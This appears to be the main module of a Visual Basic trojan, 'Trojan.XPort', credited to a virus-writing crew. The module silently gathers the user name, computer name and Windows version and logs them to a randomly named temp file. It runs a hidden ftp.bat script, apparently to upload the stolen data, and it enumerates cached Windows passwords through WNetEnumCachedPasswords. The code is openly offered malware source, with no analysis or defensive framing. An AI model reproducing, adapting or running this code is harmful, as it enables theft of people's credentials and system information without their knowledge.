Attribute VB_Name = "X"
'Trojan.XPort                               ...by gl_st0rm of [TN] vx crew

Sub Main()
Dim strInf As String, TempDir                                           'needed variablez
On Error Resume Next
TempDir = Environ("temp") & "\"                                         'Temp?
strInf = "Windows Version=" & WinVer & Chr(0) & _
         "User Name=" & UserName & Chr(0) & _
         "Computer Name=" & ComputerName                                'get info ...
fName = TempDir & Random_Names & ".log"
Call iNstall
Shell Environ("windir") & "\ftp.bat", vbHide                            'Win95/98
Shell Environ("windir") & "\system32\ftp.bat", vbHide                   'WinNT/2K
WritePrivateProfileSection "Trojan.XPort log file", strInf, fName       'log info
On Error GoTo Handle:                                                   'Error?
WNetEnumCachedPasswords "", 0, &HFF, AddressOf CallBack, 0              'GetPasswdz!
End                                                                     'end - NO_ERRORS
Handle:                                                                 'Error Catch Handle
WritePrivateProfileString "Trojan.XPort log file", "Errors", Err.Number & ";" & Err.Description, fName
End                                                                     'end
End Sub
